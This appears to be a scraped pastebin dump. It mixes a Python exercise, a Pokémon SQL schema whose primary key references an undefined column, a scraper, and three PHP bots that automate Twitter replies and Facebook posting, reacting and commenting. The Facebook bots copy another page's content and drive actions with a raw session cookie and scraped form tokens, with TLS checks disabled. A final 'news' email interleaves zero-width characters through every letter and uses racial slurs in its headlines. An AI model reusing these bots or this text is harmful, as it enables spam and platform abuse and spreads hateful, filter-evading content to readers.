    `,f=function(b,c){let d=a.createElement(b);return Object.assign(d,c),""""!==c.datasetAdClient,d};var g=f(""script"",{async:!0,src:""https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6404021102530936"",crossOrigin:""anonymous""}),h=f(""style"",{}),i=null,j=null,k=null;h.innerHTML=e,a.head.insertAdjacentElement(""beforeend"",g),a.head.insertAdjacentElement(""beforeend"",h);for(const e of c)switch(j=f(""ins"",{className:""adsbygoogle leaderboard"",style:""display:block""}),k=f(""script"",{}),k.innerText=`(adsbygoogle = window.adsbygoogle || []).push({});`,j.dataset.adSlot=e.adslot,j.dataset.adClient=""ca-pub-6404021102530936"",b?j.dataset.adtest=""on"":"""",j.appendChild(k),i=f(""div"",{className:`mav-leaderboard-container ${""bottom""===e.class&&""/""==d?e.class+"" index-container"":e.class}`}),i.appendChild(j),e.class){case""top"":""/""==d&&a.querySelector("".logo-container"").insertAdjacentElement(""afterend"",i);break;case""middle"":""/""==d&&a.querySelector(""#indexes"").insertAdjacentElement(""afterend"",i);break;case""bottom"":a.querySelector(""#content, body"").insertAdjacentElement(""beforeend"",i);}})(document,!1);"
8qvFtTd0,Untitled,Nenogzar,Python,Sunday 22nd of October 2023 09:06:34 AM CDT,"number_of_decoration = int(input())
days = int(input())
christmas_spirit = 0
total = 0

multipliers = {
    2: (2, 5),
    3: (8, 13),
    5: (15, 17),
    10: (23, -20)
}

for day in range(1, days + 1):
    if day % 11 == 0:
        number_of_decoration += 2

    if day in multipliers:
        multiplier_cost, multiplier_spirit = multipliers[day]
        total += number_of_decoration * multiplier_cost
        christmas_spirit += multiplier_spirit

    if day % 3 == 0 and day % 5 == 0:
        christmas_spirit += 30

    if day % 10 == 0:
        christmas_spirit -= 30

print(f""Total cost: {total}"")
print(f""Total spirit: {christmas_spirit}"")
"
w84CXmsq,Auto Reply Twitter,ngatmuri,PHP,Sunday 22nd of October 2023 09:06:31 AM CDT,"<?php

require 'vendor/autoload.php';

use Abraham\TwitterOAuth\TwitterOAuth;

// Function Get Random Line
function randomTweet($tweets)
{
  $lines = file($tweets);
  return $lines[array_rand($lines)];
}

// API KEY TWITTER
$consumer_key         = '';
$consumer_secret      = '';
$access_token         = '';
$access_token_secret  = '';

// Config Auto Reply
$total_tweet = 5; // Tweet per Action


// Connect to Account
$connection = new TwitterOAuth($consumer_key, $consumer_secret, $access_token, $access_token_secret);
$connection->get('account/verify_credentials');

if ($connection->getLastHttpCode() == 200) {
  // Get Tweet Status
  $get_status = $connection->get('statuses/home_timeline', ['count' => $total_tweet]);


  foreach ($get_status as $status) {
    $i = 0;
// Config Counter
$file = 'counter.txt';
$counter = 1;
    if (file_exists($file)) {
      $counter += file_get_contents($file);
    }

    // // Get Reply from File
    // $tweet = '@' . $status->user->screen_name . ' ' . randomTweet('tweet_reply.txt');

    // // Reply to Tweet
    // $connection->post('statuses/update', ['in_reply_to_status_id' => $status->id, 'status' => $tweet]);

    // Reply with Media
    $tweet = '@' . $status->user->screen_name . ' ' . randomTweet('tweet_reply.txt') . $counter;
    $media = $connection->upload('media/upload', ['media' => 'asu.PNG']);
    $data = [
      'in_reply_to_status_id' => $status->id,
      'status' => $tweet,
      'media_ids' => $media->media_id_string
    ];
    //$connection->post('statuses/update', $data);
    // // Reply to Tweet
    $connection->post('statuses/update', ['in_reply_to_status_id' => $status->id, 'status' => $tweet]);

    if ($connection->getLastHttpCode() == 200) {
      echo 'Successfully replied to ' . $tweet . '</br>';
      $i++;
    } else {
      echo 'Failed to reply to the tweet!';
      break;
    }

    file_put_contents($file, $counter);
  }

  if ($i >= 1) {
    echo '</br> Success ' . $i . ' replies';
  }
} else {
  echo 'Invalid API key!';
}
"
cVNRh2St,Auto Copy & Update Status facebook,ngatmuri,PHP,Sunday 22nd of October 2023 09:03:07 AM CDT,"<?php
error_reporting(0);

                                //Data Untuk Di COpy
$file = ""log.txt"";
$baris = count(file($file));
                                   // SELESAI \\


$target = ""173492513478894""; //target id HALAMAN/ TEMAN yang mau di copas
$aku = ""me""; //me = sendiri
$access_token = """"; 


#JANGAN EDIT SCRIPT DI BAWAH INI!!!
if(file_exists('log.txt')){
    $log=json_encode(file('log.txt')); 
}else{
    $log='';
}
$ambilFeed = curl(""https://graph.facebook.com/"".$target.""/feed?fields=full_picture,message,id&offset="".$baris.""&limit=2&access_token="".$access_token);
$json = json_decode($ambilFeed);
foreach ($json->data as $data) {
if(!ereg($data->id,$log)){
$x=$data->id.""\n"";
$y=fopen('log.txt','a');
fwrite($y,$x);
fclose($y);
    if(preg_match(""/https/i"", @$data->full_picture)){
   $kirim = curl(""https://graph.facebook.com/"".$aku.""/photos"", array(
        ""method"" => ""post"",
        ""url"" => $data->full_picture,
        ""message"" => $data->message, 
        ""access_token"" => $access_token));
    echo ""Sukses Copy Status dan FOTO "";
}else{
$kirim = curl(""https://graph.facebook.com/"".$aku.""/feed"", array(
        ""method"" => ""post"",
        ""message"" => $data->message, 
        ""access_token"" => $access_token));
echo ""<center>Sukses copy Status Mplulu <br><br>  Dengan KATA : <b>  $data->message </center>"";
}
}
}
function curl($dhan, $cha=null) {
    $love = curl_init();
    curl_setopt($love, CURLOPT_URL, $dhan);
    if($cha != null){
        curl_setopt($love, CURLOPT_POST, true);
        curl_setopt($love, CURLOPT_POSTFIELDS, $cha);
    }
    curl_setopt($love, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($love, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($love, CURLOPT_SSL_VERIFYPEER, false);
    $hmm = curl_exec($love);
    curl_close($love);
    return $hmm;
}
?><br><br><br><br><br><br>
<?php

$file = ""log.txt"";
$baris = count(file($file));

echo ""<center><b> Akan update Status ke $baris </center>"";

?>"
WyFzGVvH,buildPokemonDatabase,Ordiance,SQL,Sunday 22nd of October 2023 09:03:04 AM CDT,"DROP SCHEMA IF EXISTS pokemon;
CREATE SCHEMA pokemon;
USE pokemon;

DROP TABLE IF EXISTS `Generation`;
CREATE TABLE `Generation` (
  `ID` INT,
  `FirstReleased` DATE,
  `Region` VARCHAR(60),
  PRIMARY KEY (`ID`),
  KEY `Key` (`FirstReleased`, `Region`)
);

DROP TABLE IF EXISTS `Games`;
CREATE TABLE `Games` (
  `ID` INT,
  `Name` VARCHAR(100),
  `ReleaseDate` DATE,
  `Generation` INT,
  PRIMARY KEY (`ID`),
  FOREIGN KEY (`Generation`) REFERENCES `Generation`(`ID`),
  KEY `Key` (`Name`, `ReleaseDate`)
);

DROP TABLE IF EXISTS `Abilities`;
CREATE TABLE `Abilities` (
  `ID` INT,
  `Name` VARCHAR(60),
  `Description` VARCHAR(300),
  PRIMARY KEY (`ID`),
  KEY `Key` (`Name`, `Description`)
);

DROP TABLE IF EXISTS `Classification`;
CREATE TABLE `Classification` (
  `ID` INT,
  `Name` VARCHAR(60),
  PRIMARY KEY (`ID`),
  KEY `Key` (`Name`)
);

DROP TABLE IF EXISTS `Pokemon`;
CREATE TABLE `Pokemon` (
  `ID` INT,
  `Name` VARCHAR(60),
  `Romanji` VARCHAR(60),
  `Type1` VARCHAR(60),
  `Type2` VARCHAR(60),
  `Classification` INT,
  `Attack` INT,
  `Defense` INT,
  `Hp` INT,
  `Sp_attack` INT,
  `Sp_defense` INT,
  `Speed` INT,
  `Weight_kg` FLOAT,
  `Generation` INT,
  `Is_legendary` BOOL,
  PRIMARY KEY (`PokedexID`),
  FOREIGN KEY (`Classification`) REFERENCES `Classification`(`ID`),
  FOREIGN KEY (`Generation`) REFERENCES `Generation`(`ID`),
  KEY `Key` (`Name`, `Romanji`, `Type1`, `Type2`, `Attack`, `Defense`, `Hp`, `Sp_attack`, `Sp_defense`, `Speed`, `Weight_kg`, `Is_legendary`)
);

DROP TABLE IF EXISTS `PokemonAbilities`;
CREATE TABLE `PokemonAbilities` (
  `ID` INT,
  `PokemonID` INT,
  `AbilityID` INT,
  PRIMARY KEY (`ID`),
  FOREIGN KEY (`AbilityID`) REFERENCES `Abilities`(`ID`),
  FOREIGN KEY (`PokemonID`) REFERENCES `Pokemon`(`ID`)
);

"
2A47xqGf,Auto Reaction & Comment facebook,ngatmuri,PHP,Sunday 22nd of October 2023 08:59:25 AM CDT,"<?php
ob_start('ob_gzhandler');
$cookie          = ""XXXX"";
$id_user         = ""XXXX""; //idfb kamu
$message_comment = ""Test bot komentar..."";
$botkomen        = ""true""; //true atau false
$reaction_type   = ""2""; //1 like, 2 love, 3 wow, 4 haha, 5 sad, 6 angry

$url     = curl(""https://m.facebook.com/"", $cookie);

preg_match_all('/name=""fb_dtsg"" value=""(.*?)"" autocomplete=""off""/is',$url, $fbdtsg);
$fb_dtsg = $fbdtsg[1][0];

if (preg_match_all('#ft_ent_identifier=(.+?)&#is', $url, $gettings)) {
    for ($i = 0; $i < count($gettings[1]); $i++) {
        if (file_exists('logs/' . $id_user)) {
            $log = json_encode(file('logs/' . $id_user));
        } else {
            $log = '';
        }

        if (!preg_match(""/"" . $gettings[1][$i] . ""/"", $log)) {
            SaveLog($id_user, $gettings[1][$i]);
            echo $gettings[1][$i];
            post_data(""https://m.facebook.com/ufi/reaction/?ft_ent_identifier="" . $gettings[1][$i] . ""&story_render_location=feed_mobile&feedback_source=1&ext=1481005962&hash=AeQ4UUnFz59Av9t5&refid=8&_ft_=qid.6359758912943651311%3Amf_story_key.-7381576517051739942%3Atop_level_post_id.1864991263733728&av="" . $id_user . ""&client_id=1480746770343%3A1208387900&session_id=d06a94e"", ""reaction_type="" . $reaction_type . ""&ft_ent_identifier="" . $gettings[1][$i] . ""&m_sess=&fb_dtsg="" . $fb_dtsg . ""&__dyn=1KQEGho5q5UjwgqgWF48xO6ES9xG6UO3m2i5UfUdoaoS2W1DwywlEf8lwJwwwj8qw8K19x61YCw9y4o52&__req=8&__ajax__=AYlpFTgedhZpQN6Xa3bjcqPQSPGdIKK-fJ0z-WBYLUsYSRpMZh2tQMCB-kn2M8LJrHfPFI4SxqYF22XCznsNr7RaGnRRaO4Tm8ucCWF32Wr7OA&__user="" . $id_user, $cookie);
            if ($botkomen == 'true') {
                echo "" => "".$message_comment."" "";
                post_data(""https://m.facebook.com/a/comment.php?fs=8&fr=%2Fprofile.php&actionsource=13&comment_logging&ft_ent_identifier="" . $gettings[1][$i] . ""&gfid=AQDWVdFsGh2dPr2T&_ft_=top_level_post_id."" . $gettings[1][$i] . ""%3Atl_objid."" . $gettings[1][$i] . ""%3Athid."" . $id_user . ""&av="" . $id_user . ""&refid=52"", ""fb_dtsg="" . $fb_dtsg . ""&comment_text="" . $message_comment, $cookie);
            }
            echo ""SUKSES<br>"";
        } else {
            echo $gettings[1][$i]. "" => Sudah pernah di eksekusi...<br>"";
        }
    }
}

function SaveLog($fbid, $datapost)
{
    return file_put_contents(""logs/{$fbid}"", $datapost.PHP_EOL, FILE_APPEND);
}

function curl($url, $cookie)
{
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    $head[] = ""Connection: keep-alive"";
    $head[] = ""Keep-Alive: 300"";
    $head[] = ""Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"";
    $head[] = ""Accept-Language: en-us,en;q=0.5"";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
}

function post_data($site, $data, $cookie)
{
    $datapost = curl_init();
    $headers  = array(
        ""Expect:""
    );
    curl_setopt($datapost, CURLOPT_URL, $site);
    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
    curl_setopt($datapost, CURLOPT_HEADER, TRUE);
    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
    curl_setopt($datapost, CURLOPT_POST, TRUE);
    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
    curl_setopt($datapost, CURLOPT_COOKIE, $cookie);
    ob_start();
    curl_exec($datapost);
    //return curl_exec($datapost);
    ob_end_clean();
    curl_close($datapost);
    unset($datapost);
}
?>"
puwQw40w,HardRP FUTUREEEEEEE,1cy228,HTML,Sunday 22nd of October 2023 08:51:01 AM CDT,"<align=center><size=50><link=""https://discord.gg/tbPgJQ9cEn""><color=#2980B9><u>DIS</u><color=#F4D03F><u>CORD</u></color></link></size></align>"
n6MbWJGu,scrapeAbilitiesData,Ordiance,Python,Sunday 22nd of October 2023 08:46:36 AM CDT,"import requests
from bs4 import BeautifulSoup
import pandas as pd

# Fetch ""Pokémon""-ability information from PokemonDB
URL = ""https://pokemondb.net/ability""
response = requests.get(URL)

# Initialize parser
soup = BeautifulSoup(response.content, 'html.parser')

# Find data-table storing all abilities along with their descriptions
table = soup.find(attrs={""class"" : ""data-table""})

# Store all rows of table in a list, skip header
rows = table.find_all(""tr"")[1:]

# Iterate through all rows, find all cells, store their text contents as a list entry
entries = [[entry.text for entry in row.find_all(""td"")] for row in rows]


# Create dataframe from 2d-array ""entries""
df = pd.DataFrame(entries, columns=[""Name"", ""Pokémon"", ""Description"", ""Generation""])

# Drop columns ""Pokémon"" and ""Generation""
df.drop([""Pokémon"", ""Generation""], axis=1, inplace=True)

# Fill out missing description entry of ability ""Quick Draw""
df.Description.iloc[185] = ""Enables the Pokémon to move first occasionally.""


df.to_csv(""dataClean/Abilities.csv"")
"
whh6d8xR,News Oct22 23,Newscaster_Ned,Email,Sunday 22nd of October 2023 08:42:00 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

I‎t‎'‎s‎ ‎m‎e‎!‎ ‎M‎a‎r‎i‎o‎!‎

D‎e‎f‎e‎n‎s‎e‎ ‎S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎I‎s‎s‎u‎e‎s‎ ‎P‎r‎e‎p‎a‎r‎e‎-‎t‎o‎-‎D‎e‎p‎l‎o‎y‎ ‎O‎r‎d‎e‎r‎s‎ ‎f‎o‎r‎ ‎U‎.‎S‎.‎ ‎T‎r‎o‎o‎p‎s‎
S‎A‎G‎-‎A‎F‎T‎R‎A‎ ‎B‎a‎n‎s‎ ‎S‎t‎r‎i‎k‎i‎n‎g‎ ‎A‎c‎t‎o‎r‎s‎ ‎f‎r‎o‎m‎ ‎D‎r‎e‎s‎s‎i‎n‎g‎ ‎u‎p‎ ‎f‎o‎r‎ ‎H‎a‎l‎l‎o‎w‎e‎e‎n‎
H‎a‎r‎r‎y‎ ‎a‎n‎d‎ ‎M‎e‎g‎h‎a‎n‎ ‎F‎l‎y‎ ‎A‎w‎a‎y‎ ‎o‎n‎ ‎P‎r‎i‎v‎a‎t‎e‎ ‎J‎e‎t‎ ‎f‎o‎r‎ ‎C‎a‎r‎i‎b‎b‎e‎a‎n‎ ‎H‎o‎l‎i‎d‎a‎y‎
C‎h‎a‎n‎c‎e‎l‎l‎o‎r‎ ‎O‎l‎a‎f‎ ‎S‎c‎h‎o‎l‎z‎ ‎C‎o‎n‎d‎e‎m‎n‎s‎ ‎R‎i‎s‎e‎ ‎o‎f‎ ‎A‎n‎t‎i‎s‎e‎m‎i‎t‎i‎s‎m‎ ‎i‎n‎ ‎G‎e‎r‎m‎a‎n‎y‎
M‎i‎c‎h‎a‎e‎l‎ ‎R‎a‎p‎a‎p‎o‎r‎t‎ ‎H‎a‎m‎m‎e‎r‎s‎ ‎l‎l‎h‎a‎n‎ ‎O‎m‎a‎r‎ ‎f‎o‎r‎ ‎S‎p‎r‎e‎a‎d‎i‎n‎g‎ ‎‘‎B‎u‎l‎l‎s‎*‎*‎t‎ ‎F‎a‎k‎e‎ ‎N‎e‎w‎s‎'‎
M‎e‎t‎ ‎P‎o‎l‎i‎c‎e‎:‎ ‎C‎a‎l‎l‎i‎n‎g‎ ‎f‎o‎r‎ ‎J‎i‎h‎a‎d‎ ‎I‎s‎ ‎L‎a‎w‎f‎u‎l‎ ‎a‎s‎ ‎W‎o‎r‎d‎ ‎h‎a‎s‎ ‎'‎N‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎M‎e‎a‎n‎i‎n‎g‎s‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
D‎e‎t‎r‎o‎i‎t‎ ‎S‎y‎n‎a‎g‎o‎g‎u‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎S‎a‎m‎a‎n‎t‎h‎a‎ ‎W‎o‎l‎l‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎O‎u‎t‎s‎i‎d‎e‎ ‎o‎f‎ ‎H‎e‎r‎ ‎H‎o‎m‎e‎

f‎o‎u‎n‎d‎e‎d‎ ‎’‎M‎u‎s‎l‎i‎m‎-‎J‎e‎w‎i‎s‎h‎ ‎F‎o‎r‎u‎m‎ ‎o‎f‎ ‎D‎e‎t‎r‎o‎i‎t‎’‎
S‎a‎m‎a‎n‎t‎h‎a‎ ‎W‎o‎l‎l‎ ‎(‎I‎s‎a‎a‎c‎ ‎A‎g‎r‎e‎e‎ ‎D‎o‎w‎n‎t‎o‎w‎n‎ ‎S‎y‎n‎a‎g‎o‎g‎u‎e‎ ‎/‎ ‎F‎a‎c‎e‎b‎o‎o‎k‎)‎
S‎a‎m‎a‎n‎t‎h‎a‎ ‎W‎o‎l‎l‎,‎ ‎4‎0‎,‎ ‎b‎o‎a‎r‎d‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎I‎s‎a‎a‎c‎ ‎A‎g‎r‎e‎e‎ ‎D‎o‎w‎n‎t‎o‎w‎n‎ ‎S‎y‎n‎a‎g‎o‎g‎u‎e‎ ‎i‎n‎ ‎D‎e‎t‎r‎o‎i‎t‎,‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎,‎ ‎w‎a‎s‎ ‎m‎u‎r‎d‎e‎r‎e‎d‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎,‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎f‎o‎u‎n‎d‎ ‎s‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎d‎e‎a‎t‎h‎ ‎o‎u‎t‎s‎i‎d‎e‎ ‎h‎e‎r‎ ‎h‎o‎m‎e‎.‎

I‎s‎r‎a‎e‎l‎ ‎S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎C‎r‎e‎a‎t‎e‎s‎ ‎U‎n‎i‎t‎ ‎t‎o‎ ‎K‎i‎l‎l‎ ‎E‎v‎e‎r‎y‎ ‎M‎e‎m‎b‎e‎r‎ ‎o‎f‎ ‎H‎a‎m‎a‎s‎ ‎A‎t‎t‎a‎c‎k‎
I‎s‎r‎a‎e‎l‎ ‎S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎C‎r‎e‎a‎t‎e‎s‎ ‎U‎n‎i‎t‎ ‎t‎o‎ ‎K‎i‎l‎l‎ ‎E‎v‎e‎r‎y‎ ‎M‎e‎m‎b‎e‎r‎ ‎o‎f‎ ‎H‎a‎m‎a‎s‎ ‎A‎t‎t‎a‎c‎k‎
6‎7‎1‎
M‎e‎e‎t‎ ‎t‎h‎e‎ ‎2‎5‎ ‎'‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎'‎ ‎W‎h‎o‎ ‎V‎o‎t‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎J‎i‎m‎ ‎J‎o‎r‎d‎a‎n‎ ‎f‎o‎r‎ ‎S‎p‎e‎a‎k‎e‎r‎
M‎e‎e‎t‎ ‎t‎h‎e‎ ‎2‎5‎ ‎'‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎'‎ ‎W‎h‎o‎ ‎V‎o‎t‎e‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎J‎i‎m‎ ‎J‎o‎r‎d‎a‎n‎ ‎f‎o‎r‎ ‎S‎p‎e‎a‎k‎e‎r‎
6‎,‎8‎0‎4‎
T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎U‎C‎-‎D‎a‎v‎i‎s‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎'‎Z‎i‎o‎n‎i‎s‎t‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎,‎'‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎U‎C‎-‎D‎a‎v‎i‎s‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎'‎Z‎i‎o‎n‎i‎s‎t‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎,‎'‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
7‎5‎1‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎a‎v‎e‎ ‎C‎h‎a‎p‎p‎e‎l‎l‎e‎ ‎G‎o‎e‎s‎ ‎o‎n‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎R‎a‎n‎t‎;‎ ‎J‎e‎w‎s‎ ‎L‎e‎a‎v‎e‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎a‎v‎e‎ ‎C‎h‎a‎p‎p‎e‎l‎l‎e‎ ‎G‎o‎e‎s‎ ‎o‎n‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎R‎a‎n‎t‎;‎ ‎J‎e‎w‎s‎ ‎L‎e‎a‎v‎e‎
1‎,‎2‎4‎5‎
S‎y‎n‎a‎g‎o‎g‎u‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎D‎e‎t‎r‎o‎i‎t‎
S‎y‎n‎a‎g‎o‎g‎u‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎D‎e‎t‎r‎o‎i‎t‎
7‎,‎4‎1‎0‎
H‎o‎u‎s‎e‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎W‎o‎r‎k‎ ‎T‎o‎w‎a‎r‎d‎s‎ ‎E‎l‎e‎c‎t‎i‎n‎g‎ ‎N‎e‎w‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎O‎n‎ ‎C‎a‎p‎i‎t‎o‎l‎ ‎H‎i‎l‎l‎
J‎i‎m‎ ‎J‎o‎r‎d‎a‎n‎ ‎O‎u‎s‎t‎e‎d‎ ‎a‎s‎ ‎G‎O‎P‎ ‎S‎p‎e‎a‎k‎e‎r‎-‎D‎e‎s‎i‎g‎n‎a‎t‎e‎ ‎b‎y‎ ‎S‎e‎c‎r‎e‎t‎ ‎B‎a‎l‎l‎o‎t‎
6‎,‎2‎7‎4‎
$‎2‎0‎0‎K‎ ‎P‎a‎y‎m‎e‎n‎t‎ ‎t‎o‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎B‎r‎o‎t‎h‎e‎r‎ ‎J‎a‎m‎e‎s‎ ‎A‎p‎p‎e‎a‎r‎s‎ ‎L‎i‎n‎k‎e‎d‎ ‎t‎o‎ ‎F‎a‎m‎i‎l‎y‎ ‎B‎i‎z‎
$‎2‎0‎0‎K‎ ‎P‎a‎y‎m‎e‎n‎t‎ ‎t‎o‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎f‎r‎o‎m‎ ‎B‎r‎o‎t‎h‎e‎r‎ ‎J‎a‎m‎e‎s‎ ‎A‎p‎p‎e‎a‎r‎s‎ ‎L‎i‎n‎k‎e‎d‎ ‎t‎o‎ ‎F‎a‎m‎i‎l‎y‎ ‎B‎i‎z‎
4‎,‎5‎0‎6‎
A‎O‎C‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎M‎u‎s‎t‎ ‎B‎e‎ ‎R‎e‎a‎d‎y‎ ‎t‎o‎ ‎I‎m‎p‎o‎r‎t‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎
A‎O‎C‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎M‎u‎s‎t‎ ‎B‎e‎ ‎R‎e‎a‎d‎y‎ ‎t‎o‎ ‎I‎m‎p‎o‎r‎t‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎
3‎,‎7‎9‎9‎
R‎e‎p‎o‎r‎t‎ ‎D‎e‎t‎a‎i‎l‎s‎ ‎H‎o‎w‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎L‎o‎s‎t‎ ‎O‎n‎l‎i‎n‎e‎ ‎W‎a‎r‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎
R‎e‎p‎o‎r‎t‎ ‎D‎e‎t‎a‎i‎l‎s‎ ‎H‎o‎w‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎L‎o‎s‎t‎ ‎O‎n‎l‎i‎n‎e‎ ‎W‎a‎r‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎
6‎4‎9‎
M‎e‎t‎ ‎P‎o‎l‎i‎c‎e‎:‎ ‎C‎a‎l‎l‎i‎n‎g‎ ‎f‎o‎r‎ ‎J‎i‎h‎a‎d‎ ‎I‎s‎ ‎L‎a‎w‎f‎u‎l‎ ‎a‎s‎ ‎W‎o‎r‎d‎ ‎h‎a‎s‎ ‎'‎N‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎M‎e‎a‎n‎i‎n‎g‎s‎'‎
M‎e‎t‎ ‎P‎o‎l‎i‎c‎e‎:‎ ‎C‎a‎l‎l‎i‎n‎g‎ ‎f‎o‎r‎ ‎J‎i‎h‎a‎d‎ ‎I‎s‎ ‎L‎a‎w‎f‎u‎l‎ ‎a‎s‎ ‎W‎o‎r‎d‎ ‎h‎a‎s‎ ‎'‎N‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎M‎e‎a‎n‎i‎n‎g‎s‎'‎

N‎e‎g‎r‎o‎ ‎W‎a‎n‎t‎e‎d‎ ‎f‎o‎r‎ ‎2‎ ‎M‎e‎t‎r‎o‎ ‎H‎o‎m‎i‎c‎i‎d‎e‎s‎ ‎i‎n‎ ‎K‎a‎n‎s‎a‎s‎ ‎C‎i‎t‎y‎.‎

W‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎y‎o‎u‎,‎ ‎J‎e‎r‎o‎m‎e‎?‎


P‎o‎l‎i‎c‎e‎ ‎A‎r‎r‎e‎s‎t‎ ‎T‎a‎n‎z‎a‎n‎i‎a‎n‎ ‎N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎P‎e‎o‎p‎l‎e‎ ‎a‎t‎ ‎M‎a‎l‎l‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎


